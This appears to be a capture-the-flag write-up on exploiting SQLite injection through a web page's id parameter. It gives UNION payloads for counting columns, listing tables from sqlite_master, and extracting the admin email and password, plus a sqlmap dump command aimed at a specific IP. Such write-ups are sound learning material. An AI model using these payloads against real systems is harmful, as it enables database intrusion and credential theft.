
## 25 AUG 2021 |  sqlite integer  injection 


when first viist the site and press at any image it seems we have parameter id 

![image](https://user-images.githubusercontent.com/67979878/130710864-8a938c41-984f-47eb-a6a4-39d6a1d98976.png)


try some IDOR stuff but failed , however when try ' OR 1=1 --  it throws out an error 

![image](https://user-images.githubusercontent.com/67979878/130710980-f335618a-9e6e-4ee1-9fa9-73e0861abd7b.png)

this error indicates sqlite database so let's play around :) 


### [+] Great reference :

https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf


https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md



Enumeration :
---------------

first we need to know how many columns to add to the UNION statement let's test :
````
id=3 UNION SELECT 1 -- 
id=3 UNION SELECT 1 ,2-- 
id=3 UNION SELECT 1 ,2,3--
id=3 UNION SELECT 1 ,2,3,4--
id=3 UNION SELECT 1 ,2,3,4,5-- 
````

it throws error at all execpt the last one :
![image](https://user-images.githubusercontent.com/67979878/130711281-e9394b7e-0744-4bcb-869f-8898f03da187.png)

time to get table names :) 

`id=3 UNION SELECT 1 ,tbl_name ,3,4,5 FROM sqlite_master-- `

![image](https://user-images.githubusercontent.com/67979878/130711766-19608348-d673-4d86-8538-8d9f4f75ab50.png)


let's check : `nxf8_users`

`id=3 UNION SELECT 1 ,sql,3,4,5 FROM sqlite_master WHERE name='nxf8_users'--`


![image](https://user-images.githubusercontent.com/67979878/130711910-3337ccb3-e5a6-4ccd-8186-6ae4f5c02326.png)

we need to get email of admin so let's use :

`id=3  UNION SELECT 1 ,email,3,password,5 FROM nxf8_users WHERE role='admin'-- `

![image](https://user-images.githubusercontent.com/67979878/130712086-9b405882-a69c-4dff-b0b2-cee17be6ba8b.png)

email is the flag 


can also use sqlmap :

` sqlmap -u "18.192.3.151/whoisadmin/shownews.php?id=3 " --dump   `

![image](https://user-images.githubusercontent.com/67979878/130712605-e75c5b87-660b-4407-a255-54097c031deb.png)

# done 
